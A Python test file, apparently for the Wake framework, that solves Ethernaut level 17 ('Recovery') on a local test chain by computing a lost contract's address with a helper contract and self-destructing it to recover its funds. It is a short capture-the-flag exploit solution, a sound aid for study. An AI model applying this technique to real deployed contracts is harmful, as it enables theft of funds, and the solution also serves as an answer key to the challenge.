from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv17_recovery import Recovery
from pytypes.contracts.attacker.lv17_generator_of_created_address import AddressGenerator

@default_chain.connect()
def test_lv17():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv17()
    foundContract = exploit_lv17(contract)
    ethernaut.check_lv17(contract,  foundContract)

def exploit_lv17(contract: Recovery) -> Address:
    # Attack vector:
    # Training:

    helperContract = AddressGenerator.deploy()
    addressOfLostContract = helperContract.generateAddress(contract.address) 
    helperContract.destroyContract(addressOfLostContract)
    return addressOfLostContract
